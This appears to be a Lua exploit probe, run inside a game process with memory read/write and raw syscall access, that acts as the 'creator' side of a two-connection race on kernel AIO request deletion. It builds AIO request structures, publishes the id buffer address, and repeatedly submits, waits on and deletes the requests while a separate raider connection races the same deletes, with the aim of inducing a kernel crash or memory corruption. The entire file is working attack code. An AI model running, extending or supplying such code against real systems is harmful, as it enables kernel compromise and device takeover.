-- CRASH_CLASS: HIGH
-- PROBE 899a: creator side of a two-connection delete race. The game process is
-- shared across TCP connections (887a-890a), so two Lua states can delete the same
-- aio id at the same moment. This side publishes the id buffer address; the raider
-- connection hammers delete on that buffer while this side deletes once per round.
print("=== PROBE 899a: aio race, creator ===")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wq(a,v) pcall(function() memory.write_qword(a,uint64(v)) end) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
print("[0] pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
local sv=memory.alloc(8); zero(sv,8)
pcall(function() mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
local fd=rd(sv); print("[1] socketpair fd="..tostring(fd))
local N=4
local reqs=memory.alloc(0x28*N); zero(reqs,0x28*N)
local buf=memory.alloc(0x1000); zero(buf,0x1000)
local b=to_num(buf)
for i=0,N-1 do local r=reqs+i*0x28
  wd(r+0x08,0x1000); wd(r+0x10,b%4294967296); wd(r+0x14,math.floor(b/4294967296)); wd(r+0x20,fd) end
local ids=memory.alloc(32); zero(ids,32)
local st=memory.alloc(32); local er=memory.alloc(32)
print(string.format("IDBUF=0x%X",to_num(ids)))
for round=1,5 do
  zero(ids,32); zero(st,32)
  local o,r=pcall(function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(N),uint64(3),uint64(ids)) end)
  if not o then print("[R"..round.."] submit FAIL") break end
  pcall(function() mk(666)(uint64(ids),uint64(N),uint64(st)) end)
  pcall(function() mk(664)(uint64(ids),uint64(N),uint64(st)) end)
  print(string.format("[R%d] ids=%X,%X,%X,%X st=%s,%s,%s,%s",round,
     rd(ids) or 0,rd(ids+4) or 0,rd(ids+8) or 0,rd(ids+12) or 0,
     tostring(rd(st)),tostring(rd(st+4)),tostring(rd(st+8)),tostring(rd(st+12))))
  sleep_ms(400)
  zero(er,32)
  local o2,r2=pcall(function() return mk(662)(uint64(ids),uint64(N),uint64(er)) end)
  print(string.format("[R%d] A-delete ret=%s errs=%X,%X,%X,%X",round,
     tostring(o2 and to_num(r2) or "FAIL"),rd(er) or 0,rd(er+4) or 0,rd(er+8) or 0,rd(er+12) or 0))
  sleep_ms(400)
end
print("[Z] alive pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
